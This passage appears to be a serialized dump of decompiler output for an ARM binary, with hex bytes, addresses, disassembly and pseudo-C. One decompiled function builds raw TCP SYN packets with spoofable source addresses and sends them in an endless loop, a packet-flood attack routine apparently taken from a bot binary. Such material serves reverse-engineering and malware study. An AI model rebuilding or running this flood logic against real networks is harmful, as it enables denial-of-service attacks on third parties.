30 83 e0\n00 00 63 e0\n01 00 80 e2\ncd f9 ff eb\n07 ff ff ea\n56 1e 8d e2\n00 00 9a e5\n06 10 81 e2\n02 20 82 e2\n01 39 a0 e3\nd2 f9 ff eb\n4f ff ff ea\n00 30 95 e5\n04 00 53 e3\n0b 00 53 13\nfc fe ff 0a\n00 00 9a e5\n01 00 70 e3\n0c fa ff 1b\nc4 30 9f e5\n00 20 e0 e3\n00 20 83 e5\n01 00 a0 e3\nb9 f9 ff eb\nf3 fe ff ea\n05 0c 8d e2\n08 00 80 e2\n6a 02 00 eb\n66 05 cd e5\ne5 02 00 eb\n88 10 9f e5\n05 20 a0 e1\n00 00 81 e5\n01 39 a0 e3\n9c 10 9f e5\n00 00 94 e5\nb8 f9 ff eb\n56 1e 8d e2\n01 20 a0 e3\n00 00 94 e5\n06 10 81 e2\n01 39 a0 e3\nb2 f9 ff eb\n66 25 dd e5\n00 00 52 e3\nde fe ff 0a\n05 1c 8d e2\n00 00 94 e5\n08 10 81 e2\n01 39 a0 e3\naa f9 ff eb\nd8 fe ff ea\n56 1e 8d e2\n00 00 98 e5\n06 10 81 e2\n02 20 a0 e3\n01 39 83 e2\n85 f9 ff eb\nd1 fe ff ea\n00 00 98 e5\ne2 f9 ff eb\n00 30 e0 e3\n00 30 88 e5\ncc fe ff ea\n'
p376
S'.text:00009bac\n.text:00009bb0\n.text:00009bb4\n.text:00009bb8\n.text:00009bbc\n.text:00009bc0\n.text:00009bc4\n.text:00009bc8\n.text:00009bcc\n.text:00009bd0\n.text:00009bd4\n.text:00009bd8\n.text:00009bdc\n.text:00009be0\n.text:00009be4\n.text:00009be8\n.text:00009bec\n.text:00009bf0\n.text:00009bf4\n.text:00009bf8\n.text:00009bfc\n.text:00009c00\n.text:00009c04\n.text:00009c08\n.text:00009c0c\n.text:00009c10\n.text:00009c14\n.text:00009c18\n.text:00009c1c\n.text:00009c20\n.text:00009c24\n.text:00009c28\n.text:00009c2c\n.text:00009c30\n.text:00009c34\n.text:00009c38\n.text:00009c3c\n.text:00009c40\n.text:00009c44\n.text:00009c48\n.text:00009c4c\n.text:00009c50\n.text:00009c54\n.text:00009c58\n.text:00009c5c\n.text:00009c60\n.text:00009c64\n.text:00009c68\n.text:00009c6c\n.text:00009c70\n.text:00009c74\n.text:00009c78\n.text:00009c7c\n.text:00009c80\n.text:00009c84\n.text:00009c88\n.text:00009c8c\n.text:00009c90\n.text:00009c94\n.text:00009c98\n.text:00009c9c\n.text:00009ca0\n.text:00009ca4\n.text:00009ca8\n.text:00009cac\n.text:00009cb0\n.text:00009cb4\n.text:00009cb8\n.text:00009cbc\n.text:00009cc0\n.text:00009cc4\n.text:00009cc8\n.text:00009ccc\n.text:00009cd0\n.text:00009cd4\n.text:00009cd8\n.text:00009cdc\n.text:00009ce0\n.text:00009ce4\n.text:00009ce8\n.text:00009cec\n.text:00009cf0\n.text:00009cf4\n.text:00009cf8\n.text:00009cfc\n.text:00009d00\n.text:00009d04\n.text:00009d08\n.text:00009d0c\n.text:00009d10\n.text:00009d14\n.text:00009d18\n.text:00009d1c\n.text:00009d20\n.text:00009d24\n.text:00009d28\n.text:00009d2c\n.text:00009d30\n.text:00009d34\n.text:00009d38\n.text:00009d3c\n.text:00009d40\n.text:00009d44\n.text:00009d48\n.text:00009d4c\n.text:00009d50\n.text:00009d54\n.text:00009d58\n.text:00009d5c\n.text:00009d60\n.text:00009d64\n.text:00009d68\n.text:00009d6c\n.text:00009d70\n.text:00009d74\n.text:00009d78\n.text:00009d7c\n.text:00009d80\n.text:00009d84\n.text:00009d88\n.text:00009d8c\n.text:00009d90\n.text:00009d94\n.text:00009d98\n.text:00009d9c\n.text:00009da0\n.text:00009da4\n.text:00009da8\n.text:00009dac\n.text:00009db0\n.text:00009db4\n.text:00009db8\n.text:00009dbc\n.text:00009dc0\n.text:00009dc4\n.text:00009dc8\n.text:00009dcc\n.text:00009dd0\n.text:00009dd4\n.text:00009dd8\n.text:00009ddc\n.text:00009de0\n.text:00009de4\n.text:00009de8\n.text:00009dec\n.text:00009df0\n.text:00009df4\n.text:00009df8\n.text:00009dfc\n.text:00009e00\n.text:00009e04\n.text:00009e08\n.text:00009e0c\n.text:00009e10\n.text:00009e14\n.text:00009e18\n.text:00009e1c\n.text:00009e20\n.text:00009e24\n.text:00009e28\n.text:00009e2c\n.text:00009e30\n.text:00009e34\n.text:00009e38\n.text:00009e3c\n.text:00009e40\n.text:00009e44\n.text:00009e48\n.text:00009e4c\n.text:00009e50\n.text:00009e54\n.text:00009e58\n.text:00009e5c\n.text:00009e60\n.text:00009e64\n.text:00009e68\n.text:00009e6c\n.text:00009e70\n.text:00009e74\n.text:00009e78\n.text:00009e7c\n.text:00009e80\n.text:00009e84\n.text:00009e88\n.text:00009e8c\n.text:00009e90\n.text:00009e94\n.text:00009e98\n.text:00009e9c\n.text:00009ea0\n.text:00009ea4\n.text:00009ea8\n.text:00009eac\n.text:00009eb0\n.text:00009eb4\n.text:00009eb8\n.text:00009ebc\n.text:00009ec0\n.text:00009ec4\n.text:00009ec8\n.text:00009ecc\n.text:00009ed0\n.text:00009ed4\n.text:00009ed8\n.text:00009edc\n.text:00009ee0\n.text:00009ee4\n.text:00009ee8\n.text:00009eec\n.text:00009ef0\n.text:00009ef4\n.text:00009ef8\n.text:00009efc\n.text:00009f00\n.text:00009f04\n.text:00009f08\n.text:00009f0c\n.text:00009f10\n.text:00009f14\n.text:00009f18\n.text:00009f1c\n.text:00009f20\n.text:00009f24\n.text:00009f28\n.text:00009f2c\n.text:00009f30\n.text:00009f34\n.text:00009f38\n.text:00009f3c\n.text:00009f40\n.text:00009f44\n.text:00009f48\n.text:00009f4c\n.text:00009f50\n.text:00009f54\n.text:00009f58\n.text:00009f5c\n.text:00009f60\n.text:00009f64\n.text:00009f68\n.text:00009f6c\n.text:00009f70\n.text:00009f74\n.text:00009f78\n.text:00009f7c\n.text:00009f80\n.text:00009f84\n.text:00009f88\n.text:00009f8c\n.text:00009f90\n.text:00009f94\n.text:00009f98\n.text:00009f9c\n.text:00009fa0\n.text:00009fa4\n.text:00009fa8\n.text:00009fac\n.text:00009fb0\n.text:00009fb4\n.text:00009fb8\n.text:00009fbc\n.text:00009fc0\n.text:00009fc4\n.text:00009fc8\n.text:00009fcc\n.text:00009fd0\n.text:00009fd4\n.text:00009fd8\n.text:00009fdc\n.text:00009fe0\n.text:00009fe4\n.text:00009fe8\n.text:00009fec\n.text:00009ff0\n.text:00009ff4\n.text:00009ff8\n.text:00009ffc\n.text:0000a000\n.text:0000a004\n.text:0000a008\n.text:0000a00c\n.text:0000a010\n.text:0000a014\n.text:0000a018\n.text:0000a01c\n.text:0000a020\n.text:0000a024\n.text:0000a028\n.text:0000a02c\n.text:0000a030\n.text:0000a034\n.text:0000a038\n.text:0000a03c\n.text:0000a040\n.text:0000a044\n.text:0000a048\n.text:0000a04c\n.text:0000a050\n.text:0000a054\n.text:0000a058\n.text:0000a05c\n.text:0000a060\n.text:0000a064\n.text:0000a068\n.text:0000a06c\n.text:0000a070\n.text:0000a074\n.text:0000a078\n.text:0000a07c\n.text:0000a080\n.text:0000a084\n.text:0000a088\n.text:0000a08c\n.text:0000a090\n.text:0000a094\n.text:0000a098\n.text:0000a09c\n.text:0000a0a0\n.text:0000a0a4\n.text:0000a0a8\n.text:0000a0ac\n.text:0000a0b0\n.text:0000a0b4\n.text:0000a0b8\n.text:0000a0bc\n.text:0000a0c0\n.text:0000a0c4\n.text:0000a0c8\n.text:0000a0cc\n.text:0000a0d0\n.text:0000a0d4\n.text:0000a0d8\n.text:0000a0dc\n.text:0000a0e0\n.text:0000a0e4\n.text:0000a0e8\n.text:0000a0ec\n.text:0000a0f0\n.text:0000a0f4\n.text:0000a0f8\n.text:0000a0fc\n.text:0000a100\n.text:0000a104\n.text:0000a108\n.text:0000a10c\n.text:0000a110\n.text:0000a114\n.text:0000a118\n.text:0000a11c\n.text:0000a120\n.text:0000a124\n.text:0000a128\n.text:0000a12c\n.text:0000a130\n.text:0000a134\n.text:0000a138\n.text:0000a13c\n.text:0000a140\n.text:0000a144\n.text:0000a148\n.text:0000a14c\n.text:0000a150\n.text:0000a154\n.text:0000a158\n.text:0000a15c\n.text:0000a160\n.text:0000a164\n.text:0000a168\n.text:0000a16c\n.text:0000a170\n.text:0000a174\n.text:0000a178\n.text:0000a17c\n.text:0000a180\n.text:0000a184\n.text:0000a188\n.text:0000a18c\n.text:0000a190\n.text:0000a194\n.text:0000a198\n.text:0000a19c\n.text:0000a1a0\n.text:0000a1a4\n.text:0000a1a8\n.text:0000a1ac\n.text:0000a1b0\n.text:0000a1b4\n.text:0000a1b8\n.text:0000a1bc\n.text:0000a1c0\n.text:0000a1c4\n.text:0000a1c8\n.text:0000a1cc\n.text:0000a1d0\n.text:0000a1d4\n.text:0000a1d8\n.text:0000a1dc\n.text:0000a1e0\n.text:0000a1e4\n.text:0000a1e8\n.text:0000a1ec\n.text:0000a1f0\n.text:0000a1f4\n.text:0000a1f8\n.text:0000a1fc\n.text:0000a200\n.text:0000a204\n.text:0000a208\n.text:0000a20c\n.text:0000a210\n.text:0000a214\n.text:0000a218\n.text:0000a21c\n.text:0000a220\n.text:0000a224\n.text:0000a228\n.text:0000a22c\n.text:0000a230\n.text:0000a234\n.text:0000a238\n.text:0000a23c\n.text:0000a240\n.text:0000a244\n.text:0000a248\n.text:0000a24c\n.text:0000a250\n.text:0000a254\n.text:0000a258\n.text:0000a25c\n.text:0000a260\n.text:0000a264\n.text:0000a268\n.text:0000a26c\n.text:0000a270\n.text:0000a274\n.text:0000a278\n.text:0000a27c\n.text:0000a280\n.text:0000a284\n.text:0000a288\n.text:0000a28c\n.text:0000a290\n.text:0000a294\n.text:0000a298\n.text:0000a29c\n.text:0000a2a0\n.text:0000a2a4\n.text:0000a2a8\n.text:0000a2ac\n.text:0000a2b0\n.text:0000a2b4\n.text:0000a2b8\n.text:0000a2bc\n.text:0000a2c0\n.text:0000a2c4\n.text:0000a2c8\n.text:0000a2cc\n.text:0000a2d0\n.text:0000a2d4\n'
p377
tp378
sS'malloc'
p379
(S'\n__stdcall malloc(size_t __size)\n'
p380
V\u000a/* WARNING: Unknown calling convention yet parameter storage is locked */\u000a\u000avoid * malloc(size_t __size)\u000a\u000a{\u000a  void *pvVar1;\u000a  \u000a                    /* WARNING: Could not recover jumptable at 0x0000891c. Too many branches */\u000a                    /* WARNING: Treating indirect jump as call */\u000a  pvVar1 = (void *)(*(code *)PTR_LAB_000132a8)();\u000a  return pvVar1;\u000a}\u000a\u000a
p381
S'adr r12,0x891c\nadd r12,r12,#0xa000\nldr pc,[r12,#0x98c]!\n'
p382
S'00 c6 8f e2\n0a ca 8c e2\n8c f9 bc e5\n'
p383
S'.plt:00008914\n.plt:00008918\n.plt:0000891c\n'
p384
tp385
sS'FUN_00009280'
p386
(S'\n__stdcall FUN_00009280()\n'
p387
V\u000a/* WARNING: Type propagation algorithm not settling */\u000a\u000avoid FUN_00009280(size_t sParm1,int iParm2,undefined4 uParm3,undefined4 uParm4)\u000a\u000a{\u000a  byte bVar1;\u000a  byte bVar2;\u000a  undefined2 uVar3;\u000a  void *pvVar4;\u000a  uint uVar5;\u000a  uint uVar6;\u000a  uint uVar7;\u000a  uint uVar8;\u000a  uint uVar9;\u000a  int iVar10;\u000a  int iVar11;\u000a  uint uVar12;\u000a  uint uVar13;\u000a  uint uVar14;\u000a  uint uVar15;\u000a  uint uVar16;\u000a  int iVar17;\u000a  int __fd;\u000a  int iVar18;\u000a  void *__buf;\u000a  uint uVar19;\u000a  undefined4 uVar20;\u000a  byte *pbVar21;\u000a  sockaddr *__addr;\u000a  bool bVar22;\u000a  int local_2c [2];\u000a  \u000a  pvVar4 = calloc(sParm1,4);\u000a  bVar1 = FUN_00008eac(uParm3,uParm4,2,0);\u000a  uVar5 = FUN_00008eac(uParm3,uParm4,3,0xffff);\u000a  uVar6 = FUN_00008eac(uParm3,uParm4,4,0x40);\u000a  uVar7 = FUN_00008eac(uParm3,uParm4,5,1);\u000a  uVar8 = FUN_00008eac(uParm3,uParm4,6,0xffff);\u000a  uVar9 = FUN_00008eac(uParm3,uParm4,7,0xffff);\u000a  iVar10 = FUN_00008eac(uParm3,uParm4,0x11,0xffff);\u000a  iVar11 = FUN_00008eac(uParm3,uParm4,0x12,0);\u000a  uVar12 = FUN_00008eac(uParm3,uParm4,0xb,0);\u000a  uVar13 = FUN_00008eac(uParm3,uParm4,0xc,0);\u000a  uVar14 = FUN_00008eac(uParm3,uParm4,0xd,0);\u000a  uVar15 = FUN_00008eac(uParm3,uParm4,0xe,0);\u000a  uVar16 = FUN_00008eac(uParm3,uParm4,0xf,1);\u000a  bVar2 = FUN_00008eac(uParm3,uParm4,0x10,0);\u000a  iVar17 = FUN_00008e40(uParm3,uParm4,0x19,*(undefined4 *)PTR_DAT_00009928);\u000a  __fd = socket(2,3,6);\u000a  if (__fd != -1) {\u000a    local_2c[0] = 1;\u000a    iVar18 = setsockopt(__fd,0,3,local_2c,4);\u000a    if (iVar18 != -1) {\u000a      local_2c[0] = 0;\u000a      if (sParm1 != 0) {\u000a        do {\u000a          iVar18 = local_2c[0];\u000a          __buf = calloc(0x80,1);\u000a          *(void **)((int)pvVar4 + iVar18 * 4) = __buf;\u000a          pbVar21 = *(byte **)((int)pvVar4 + local_2c[0] * 4);\u000a          *pbVar21 = *pbVar21 & 0x4f | 0x40;\u000a          *pbVar21 = *pbVar21 & 0xf5 | 5;\u000a          pbVar21[1] = bVar1;\u000a          uVar3 = (undefined2)(uVar6 & 0xff);\u000a          bVar22 = (uVar7 & 0xff) != 0;\u000a          pbVar21[8] = (byte)(uVar6 & 0xff);\u000a          *(undefined2 *)(pbVar21 + 2) = 0x3c00;\u000a          if (bVar22) {\u000a            uVar3 = 0x40;\u000a          }\u000a          pbVar21[9] = 6;\u000a          if (bVar22) {\u000a            *(undefined2 *)(pbVar21 + 6) = uVar3;\u000a          }\u000a          *(int *)(pbVar21 + 0xc) = iVar17;\u000a          uVar20 = *(undefined4 *)(local_2c[0] * 0x18 + iParm2 + 0x10);\u000a          *(ushort *)(pbVar21 + 4) = (ushort)uVar5 >> 8 | (ushort)((uVar5 & 0xff) << 8);\u000a          *(undefined4 *)(pbVar21 + 0x10) = uVar20;\u000a          *(ushort *)(pbVar21 + 0x14) =\u000a               (ushort)(((uVar8 & 0xffff) << 0x18) >> 0x10) | (ushort)uVar8 >> 8;\u000a          pbVar21[0x20] = pbVar21[0x20] & 0xaf | 0xa0;\u000a          pbVar21[0x21] = pbVar21[0x21] & 0xdf | (byte)((uVar12 & 1) << 5);\u000a          *(uint *)(pbVar21 + 0x18) =\u000a               (uint)(iVar10 << 0x18) >> 0x10 | (uint)(iVar10 << 0x10) >> 0x18;\u000a          pbVar21[0x21] = pbVar21[0x21] & 0xef | (byte)((uVar13 & 1) << 4);\u000a          *(ushort *)(pbVar21 + 0x16) =\u000a               (ushort)(((uVar9 & 0xffff) << 0x18) >> 0x10) | (ushort)uVar9 >> 8;\u000a          pbVar21[0x21] = pbVar21[0x21] & 0xf7 | (byte)((uVar14 & 1) << 3);\u000a          pbVar21[0x21] = pbVar21[0x21] & 0xfb | (byte)((uVar15 & 1) << 2);\u000a          pbVar21[0x21] = pbVar21[0x21] & 0xfd | (byte)((uVar16 & 1) << 1);\u000a          pbVar21[0x21] = bVar2 & 1 | pbVar21[0x21] & 0xfe;\u000a          pbVar21[0x28] = 2;\u000a          pbVar21[0x29] = 4;\u000a          uVar19 = FUN_0000a308();\u000a          iVar18 = ((uVar19 & 0xf) + 0x578) * 0x10000;\u000a          *(ushort *)(pbVar21 + 0x2a) = (ushort)((uint)iVar18 >> 8) | (ushort)((uint)iVar18 >> 0x18)\u000a          ;\u000a          pbVar21[0x2c] = 4;\u000a          pbVar21[0x2e] = 8;\u000a          pbVar21[0x2f] = 10;\u000a          pbVar21[0x2d] = 2;\u000a          uVar20 = FUN_0000a308();\u000a          pbVar21[0x3b] = 6;\u000a          *(undefined4 *)(pbVar21 + 0x30) = uVar20;\u000a          *(undefined4 *)(pbVar21 + 0x34) = 0;\u000a          pbVar21[0x38] = 1;\u000a          pbVar21[0x3a] = 3;\u000a          pbVar21[0x39] = 3;\u000a          local_2c[0] = local_2c[0] + 1;\u000a        } while (local_2c[0] < (int)sParm1);\u000a      }\u000a      do {\u000a        do {\u000a        } while (sParm1 == 0);\u000a        do {\u000a          local_2c[0] = 0;\u000a          do {\u000a            iVar18 = local_2c[0] * 0x18 + iParm2;\u000a            __buf = *(void **)((int)pvVar4 + local_2c[0] * 4);\u000a            if (*(byte *)(iVar18 + 0x14) < 0x20) {\u000a              uVar7 = *(uint *)(iVar18 + 0x10);\u000a              uVar6 = FUN_0000a308();\u000a              uVar6 = (uVar7 >> 0x18 | (uVar7 & 0xff0000) >> 8 | (uVar7 & 0xff00) << 8 |\u000a                      uVar7 << 0x18) + (uVar6 >> *(sbyte *)(local_2c[0] * 0x18 + iParm2 + 0x14));\u000a              *(uint *)((int)__buf + 0x10) =\u000a                   uVar6 >> 0x18 | (uVar6 & 0xff0000) >> 8 | (uVar6 & 0xff00) << 8 |\u000a                   uVar6 * 0x1000000;\u000a            }\u000a            if (iVar17 == -1) {\u000a              uVar20 = FUN_0000a308();\u000a              *(undefined4 *)((int)__buf + 0xc) = uVar20;\u000a            }\u000a            if ((uVar5 & 0xffff) == 0xffff) {\u000a              uVar3 = FUN_0000a308();\u000a              *(undefined2 *)((int)__buf + 4) = uVar3;\u000a            }\u000a            if ((uVar8 & 0xffff) == 0xffff) {\u000a              uVar3 = FUN_0000a308();\u000a              *(undefined2 *)((int)__buf + 0x14) = uVar3;\u000a            }\u000a            if ((uVar9 & 0xffff) == 0xffff) {\u000a              uVar3 = FUN_0000a308();\u000a              *(undefined2 *)((int)__buf + 0x16) = uVar3;\u000a            }\u000a            if (iVar10 == 0xffff) {\u000a              uVar20 = FUN_0000a308();\u000a              *(undefined4 *)((int)__buf + 0x18) = uVar20;\u000a            }\u000a            if (iVar11 == 0xffff) {\u000a              uVar20 = FUN_0000a308();\u000a              *(undefined4 *)((int)__buf + 0x1c) = uVar20;\u000a            }\u000a            if ((uVar12 & 0xff) != 0) {\u000a              uVar3 = FUN_0000a308();\u000a              *(undefined2 *)((int)__buf + 0x26) = uVar3;\u000a            }\u000a            *(undefined2 *)((int)__buf + 10) = 0;\u000a            uVar3 = FUN_0000992c(__buf,0x14);\u000a            *(undefined2 *)((int)__buf + 10) = uVar3;\u000a            *(undefined2 *)((int)__buf + 0x24) = 0;\u000a            uVar3 = FUN_0000997c(__buf,(int)__buf + 0x14,0x2800,0x28);\u000a            *(undefined2 *)((int)__buf + 0x24) = uVar3;\u000a            __addr = (sockaddr *)(local_2c[0] * 0x18 + iParm2);\u000a            *(undefined2 *)__addr->sa_data = *(undefined2 *)((int)__buf + 0x16);\u000a            sendto(__fd,__buf,0x3c,0x4000,__addr,0x10);\u000a            local_2c[0] = local_2c[0] + 1;\u000a          } while (local_2c[0] < (int)sParm1);\u000a        } while (sParm1 != 0);\u000a      } while( true );\u000a    }\u000a    close(__fd);\u000a  }\u000a  return;\u000a}\u000a\u000a
p388
S'stmdb sp!,{ r4 r5 r6 r7 r8 r9 r10 r11 lr }\ncpy r8,r1\nsub sp,sp,#0x74\nmov r1,#0x4\ncpy r4,r2\ncpy r5,r3\ncpy r7,r0\nbl 0x00008968\ncpy r1,r5\nmov r2,#0x2\nmov r3,#0x0\ncpy r9,r0\ncpy r0,r4\nbl 0x00008eac\nmov r3,#0x10000\ncpy r12,r0\nand r12,r12,#0xff\nsub r3,r3,#0x1\nmov r2,#0x3\ncpy r1,r5\ncpy r0,r4\nstr r12,[sp,#0x48]\nbl 0x00008eac\ncpy r1,r5\nstr r0,[sp,#0x24]\nmov r2,#0x4\nmov r3,#0x40\ncpy r0,r4\nbl 0x00008eac\ncpy r12,r0\nand r12,r12,#0xff\ncpy r1,r5\nmov r2,#0x5\nmov r3,#0x1\ncpy r0,r4\nstr r12,[sp,#0x50]\nbl 0x00008eac\nmov r3,#0x10000\ncpy r12,r0\nand r12,r12,#0xff\nsub r3,r3,#0x1\nmov r2,#0x6\ncpy r1,r5\ncpy r0,r4\nstr r12,[sp,#0x54]\nbl 0x00008eac\nmov r3,#0x10000\ncpy r1,r5\nsub r3,r3,#0x1\nmov r2,#0x7\ncpy r11,r0\ncpy r0,r4\nbl 0x00008eac\nmov r3,#0x10000\ncpy r1,r5\nsub r3,r3,#0x1\nmov r2,#0x11\ncpy r6,r0\ncpy r0,r4\nbl 0x00008eac\ncpy r1,r5\nstr r0,[sp,#0x28]\nmov r2,#0x12\nmov r3,#0x0\ncpy r0,r4\nbl 0x00008eac\ncpy r1,r5\nstr r0,[sp,#0x2c]\nmov r2,#0xb\nmov r3,#0x0\ncpy r0,r4\nbl 0x00008eac\ncpy r1,r5\nstr r0,[sp,#0x30]\nmov r2,#0xc\nmov r3,#0x0\ncpy r0,r4\nbl 0x00008eac\ncpy r1,r5\nstr r0,[sp,#0x34]\nmov r2,#0xd\nmov r3,#0x0\ncpy r0,r4\nbl 0x00008eac\ncpy r1,r5\nstr r0,[sp,#0x38]\nmov r2,#0xe\nmov r3,#0x0\ncpy r0,r4\nbl 0x00008eac\ncpy r1,r5\nstr r0,[sp,#0x3c]\nmov r2,#0xf\nmov r3,#0x1\ncpy r0,r4\nbl 0x00008eac\ncpy r1,r5\nstr r0,[sp,#0x40]\nmov r2,#0x10\nmov r3,#0x0\ncpy r0,r4\nbl 0x00008eac\nldr r2,[0x9928]\nstr r0,[sp,#0x44]\nldr r3,[r2,#0x0]\ncpy r1,r5\nmov r2,#0x19\ncpy r0,r4\nbl 0x00008e40\nmov r1,#0x3\nstr r0,[sp,#0x60]\nmov r2,#0x6\nmov r0,#0x2\nbl 0x0000892c\ncmn r0,#0x1\ncpy r10,r0\nbeq 0x0000991c\nadd r3,sp,#0x70\nmov r2,#0x1\nstr r2,[r3,#-0x4]!\nmov r12,#0x4\nmov r1,#0x0\nadd r2,r2,#0x2\nstr r12,[sp,#0x0]\nbl 0x000089a4\ncmn r0,#0x1\nbeq 0x00009914\nldr r1,[sp,#0x24]\nmov r2,#0x0\nmov r0,r1, lsl #0x10\nmov r4,r11, lsl #0x10\nmov r5,r6, lsl #0x10\nstr r2,[sp,#0x6c]\nldr r2,[sp,#0x30]\nmov r3,r0, lsr #0x10\nmov r6,r4, lsr #0x10\nmov r1,r5, lsr #0x10\ncmp r7,#0x0\nstr r3,[sp,#0x4c]\nstr r6,[sp,#0x58]\nstr r1,[sp,#0x5c]\nand r11,r2,#0xff\nbeq 0x00009708\nldr r3,[sp,#0x28]\nmov lr,r3, lsl #0x10\nmov r3,r6, lsl #0x18\nldr r6,[sp,#0x4c]\nmov r2,r1, lsl #0x18\nmov r1,lr, lsl #0x8\nmov r1,r1, lsr #0x10\nmov r0,r0, lsr #0x18\nand r12,r6,#0xff\norr lr,r1,lr, lsr #0x18\norr r12,r0,r12, lsl #0x8\nadd r0,sp,#0x30\nldmia r0,{r0 r1 }\nmov r3,r3, lsr #0x10\nmov r2,r2, lsr #0x10\nand r0,r0,#0x1\nand r1,r1,#0x1\norr r6,r3,r4, lsr #0x18\norr r5,r2,r5, lsr #0x18\nstr r0,[sp,#0xc]\nstr r1,[sp,#0x10]\nadd r2,sp,#0x38\nldmia r2,{ r2 r3 }\nadd r0,sp,#0x40\nldmia r0,{r0 r1 }\nand r2,r2,#0x1\nand r3,r3,#0x1\nand r0,r0,#0x1\nand r1,r1,#0x1\nstr lr,[sp,#0x64]\nstr r12,[sp,#0x8]\nstr r2,[sp,#0x14]\nstr r3,[sp,#0x18]\nstr r0,[sp,#0x1c]\nstr r1,[sp,#0x20]\nmov r4,#0x0\nmov r1,#0x1\nmov r0,#0x80\nbl 0x00008968\nldr r2,[sp,#0x6c]\nstr r0,[r9,r4,lsl #0x2]\nmov r3,r2, lsl #0x5\nldr r4,[r9,r2,lsl #0x2]\nsub r3,r3,r2, lsl #0x3\nadd r0,r3,r8\nldrb r3,[r4,#0x0]\nbic r3,r3,#0xb0\norr r3,r3,#0x40\nstrb r3,[r4,#0x0]\nldrb r2,[r4,#0x0]\nbic r2,r2,#0xa\norr r2,r2,#0x5\nldr r3,[sp,#0x54]\nstrb r2,[r4,#0x0]\nldr r1,[sp,#0x48]\nstrb r1,[r4,#0x1]\nldr r2,[sp,#0x50]\ncmp r3,#0x0\nmov r3,#0x3c00\nstrb r2,[r4,#0x8]\nstrh r3,[r4,#0x2]\nmov r3,#0x6\nldr r1,[sp,#0x8]\nmovne r2,#0x40\nstrb r3,[r4,#0x9]\nstrhne r2,[r4,#0x6]\nldr r2,[sp,#0x60]\nstr r2,[r4,#0xc]\nldr r3,[r0,#0x10]\nstrh r1,[r4,#0x4]\nstr r3,[r4,#0x10]\nstrh r6,[r4,#0x14]\nadd r1,r4,#0x14\nldrb r3,[r1,#0xc]\nldrb r2,[r1,#0xd]\nldr r0,[sp,#0xc]\nbic r3,r3,#0x50\norr r3,r3,#0xa0\nbic r2,r2,#0x20\nstrb r3,[r1,#0xc]\norr r2,r2,r0, lsl #0x5\nldr r3,[sp,#0x64]\nstrb r2,[r1,#0xd]\nstr r3,[r1,#0x4]\nldrb r3,[r1,#0xd]\nldr r0,[sp,#0x10]\nbic r3,r3,#0x10\norr r3,r3,r0, lsl #0x4\nstrb r3,[r1,#0xd]\nldrb r2,[r1,#0xd]\nldr r3,[sp,#0x14]\nbic r2,r2,#0x8\norr r2,r2,r3, lsl #0x3\nstrh r5,[r1,#0x2]\nstrb r2,[r1,#0xd]\nldrb r3,[r1,#0xd]\nldr r0,[sp,#0x18]\nbic r3,r3,#0x4\norr r3,r3,r0, lsl #0x2\nstrb r3,[r1,#0xd]\nldrb r2,[r1,#0xd]\nldr r3,[sp,#0x1c]\nbic r2,r2,#0x2\norr r2,r2,r3, lsl #0x1\nstrb r2,[r1,#0xd]\nldrb r3,[r1,#0xd]\nldr r0,[sp,#0x20]\nbic r3,r3,#0x1\norr r3,r0,r3\nstrb r3,[r1,#0xd]\nmov r2,#0x4\nmov r1,#0x2\nstrb r1,[r4,#0x28]\nstrb r2,[r4,#0x29]\nbl 0x0000a308\nand r0,r0,#0xf\nadd r0,r0,#0x570\nadd r0,r0,#0x8\nmov r0,r0, lsl #0x10\nmov r3,r0, lsr #0x8\nand r3,r3,#0xff00\norr r3,r3,r0, lsr #0x18\nstrh r3,[r4,#0x2a]\nmov r3,#0x4\nstrb r3,[r4,#0x2c]\nmov r2,#0xa\nmov r3,#0x8\nmov r0,#0x2\nstrb r3,[r4,#0x2e]\nstrb r2,[r4,#0x2f]\nstrb r0,[r4,#0x2d]\nbl 0x0000a308\nmov r2,#0x6\nstrb r2,[r4,#0x3b]\nmov r1,#0x3\nmov r3,#0x0\nmov r2,#0x1\nstr r0,[r4,#0x30]\nstr r3,[r4,#0x34]\nstrb r2,[r4,#0x38]\nstrb r1,[r4,#0x3a]\nstrb r1,[r4,#0x39]\nldr r3,[sp,#0x6c]\nadd r4,r3,r2\ncmp r4,r7\nstr r4,[sp,#0x6c]\nblt 0x0000954c\nmov r3,#0x0\ncmp r7,#0x0\nstr r3,[sp,#0x6c]\nbeq 0x00009708\ncpy r0,r3\nmov r3,r0, lsl #0x5\nsub r3,r3,r0, lsl #0x3\nadd r3,r3,r8\nldrb r2,[r3,#0x14]\nldr r5,[r9,r0,lsl #0x2]\ncmp r2,#0x1f\nadd r6,r5,#0x14\nbls 0x0000982c\nldr r3,[sp,#0x60]\ncmn r3,#0x1\nbeq 0x0000988c\nmov r4,#0x10000\nldr r0,[sp,#0x4c]\nsub r4,r4,#0x1\ncmp r0,r4\nbeq 0x000098a8\nldr r1,[sp,#0x58]\ncmp r1,r4\nbeq 0x000098bc\nldr r2,[sp,#0x5c]\ncmp r2,r4\nbeq 0x000098d0\nldr r3,[sp,#0x28]\ncmp r3,r4\nbeq 0x000098e4\nldr r0,[sp,#0x2c]\ncmp r0,r4\nbeq 0x000098f8\ncmp r11,#0x0\nbne 0x00009908\nmov r1,#0x0\nstrh r1,[r5,#0xa]\ncpy r0,r5\nmov r1,#0x14\nbl 0x0000992c\nmov r2,#0x0\nstrh r0,[r5,#0xa]\ncpy r1,r6\nstrh r2,[r6,#0x10]\nmov r3,#0x28\nmov r2,#0x2800\ncpy r0,r5\nbl 0x0000997c\nldr r3,[sp,#0x6c]\nmov lr,r3, lsl #0x5\nstrh r0,[r6,#0x10]\nsub lr,lr,r3, lsl #0x3\nldrh r6,[r6,#0x2]\nadd lr,lr,r8\nstrh r6,[lr,#0x2]\nmov r3,#0x4000\nmov r12,#0x10\ncpy r1,r5\ncpy r0,r10\nmov r2,#0x3c\nstr lr,[sp,#0x0]\nstr r12,[sp,#0x4]\nbl 0x000089bc\nldr r3,[sp,#0x6c]\nadd r0,r3,#0x1\ncmp r0,r7\nstr r0,[sp,#0x6c]\nblt 0x0000971c\nmov r3,#0x0\ncmp r7,#0x0\nstr r3,[sp,#0x6c]\nbeq 0x00009708\nb 0x00009718\nldr r4,[r3,#0x10]\nbl 0x0000a308\nldr r3,[sp,#0x6c]\nmov r1,r3, lsl #0x5\nsub r1,r1,r3, lsl #0x3\nand r12,r4,#0xff0000\nmov r2,r4, lsr #0x18\norr r2,r2,r12, lsr #0x8\nadd r1,r1,r8\nand r3,r4,#0xff00\nldrb r12,[r1,#0x14]\norr r2,r2,r3, lsl #0x8\norr r2,r2,r4, lsl #0x18\nadd r2,r2,r0, lsr r12\nand r0,r2,#0xff0000\nmov r3,r2, lsr #0x18\norr r3,r3,r0, lsr #0x8\nand 